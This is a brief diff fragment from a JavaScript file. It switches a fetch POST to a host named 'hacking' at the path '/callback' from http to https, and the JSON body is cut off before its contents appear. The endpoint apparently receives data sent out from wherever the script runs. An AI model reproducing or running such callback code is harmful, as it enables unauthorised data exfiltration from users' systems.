@@ -49,7 +49,7 @@ async function start(){
         await delay(5)
     }
 
-    fetch('http://hacking/callback', {
+    fetch('https://hacking/callback', {
         method: 'POST', 
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
